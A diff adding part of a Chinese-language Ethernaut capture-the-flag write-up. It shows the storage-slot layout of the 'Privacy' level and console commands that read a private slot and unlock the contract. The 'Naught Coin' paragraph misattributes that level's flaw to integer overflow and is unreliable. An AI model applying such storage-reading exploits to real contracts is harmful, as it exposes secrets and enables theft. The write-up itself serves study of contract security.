@@ -98,6 +98,43 @@ contract Hack {
 
 --
 
+12. privacy
+
+以太坊在儲存時是以32 bytes為一格順序儲存的，所以定義變量的順序會影響花費Gas的多少
+
+依32 bytes 一格，會以下劃分:
+
+Slot 0
+```
+bool public locked = true;
+```
+Slot 1
+```
+uint256 public ID = block.timestamp;
+```
+Slot 2
+```
+uint8 private flattening = 10;
+uint8 private denomination = 255;
+uint16 private awkwardness = uint16(now);
+```
+Slot 3-5
+```
+bytes32[3] private data;
+```
+
+
+以下是在console的輸入過程
+```
+await web3.eth.getStorageAt(instance, 5)
+'0x60d11579d2e9f3002771e25ea211665c2728080663f62254aff89d7ef1ccd863'
+
+<!-- 取0x後面的32位 -->
+contract.unlock("0x60d11579d2e9f3002771e25ea211665c")
+```
+
+--
+
 15. Naught Coin
 
 為了防止這種漏洞，合約應該使用 SafeMath 庫來避免整數溢出攻擊。此外，合約應該在對代幣數量進行操作之前，應該先檢查操作是否合法，例如檢查代幣數量是否超過了合約的最大值。開發者還可以使用 require 語句來確保合約在滿足特定條件時才能繼續執行。
